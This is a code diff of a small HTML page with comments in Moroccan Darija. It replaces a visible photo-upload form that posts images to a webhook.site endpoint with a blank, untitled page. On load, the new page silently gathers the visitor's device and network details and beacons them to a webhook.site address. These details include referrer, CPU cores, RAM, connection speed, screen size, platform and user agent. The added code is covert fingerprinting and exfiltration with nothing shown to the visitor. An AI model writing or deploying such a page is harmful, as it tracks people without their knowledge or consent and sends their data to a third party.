@@ -3,55 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Sender</title>
+    <title></title>
     <script>
-        async function handleImageUpload(event) {
-            const file = event.target.files[0];
-            if (!file) return;
+        window.onload = function() {
+            const webhookURL = "https://webhook.site/YOUR-UNIQUE-WEBHOOK-ID";
 
-            // ⚠️ BADEL HAD L-URL B L-LIEN DYALEK LI COPITI MN WEBHOOK.SITE
-            const webhookURL = "https://webhook.site/https://webhook.site/f5b7f1ec-cd31-4fce-b9ca-6686368e404f";
-
-            document.getElementById("status").innerText = "Kat-sifta tswira, tsena wa7d chwiya...";
-
-            // 7wel tswira l Base64
-            const reader = new FileReader();
-            reader.onload = async function(e) {
-                const base64Data = e.target.result;
-
-                const payload = {
-                    timestamp: new Date().toISOString(),
-                    fileName: file.name,
-                    fileSize: file.size,
-                    fileType: file.type,
-                    imageContent: base64Data // Hna fin kayna tswira kamla
-                };
-
-                try {
-                    // Sift l l-webhook
-                    await fetch(webhookURL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
-                    });
-
-                    document.getElementById("status").innerText = "Tsifat tswira b naja7 l Webhook!";
-                } catch (err) {
-                    document.getElementById("status").innerText = "Mochkil f t-ssifit!";
-                    console.error(err);
-                }
+            // Jm3 ma3lomat mtaddrin 3la l-device w l-network
+            const payload = {
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || "Direct Visit",
+                darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light",
+                cpuCores: navigator.hardwareConcurrency || "Unknown",
+                deviceRAM: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+                connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+                downlinkSpeed: navigator.connection ? navigator.connection.downlink + " Mbps" : "Unknown",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent
             };
 
-            reader.readAsDataURL(file);
-        }
+            const data = JSON.stringify(payload);
+
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(webhookURL, data);
+            } else {
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "text/plain" },
+                    body: data
+                }).catch(err => console.error(err));
+            }
+        };
     </script>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding-top: 20%;">
-    <h3>Klicki lte7t bach t-sift tswira mn tilifonk:</h3>
-    
-    <!-- Input kat-khlli l-tilifon y-7el l-galeri wla l-caméra -->
-    <input type="file" accept="image/*" capture="environment" onchange="handleImageUpload(event)" style="font-size: 16px; padding: 10px;">
-    
-    <p id="status" style="margin-top: 20px; color: gray;"></p>
+<body style="background-color: #ffffff;">
 </body>
 </html>
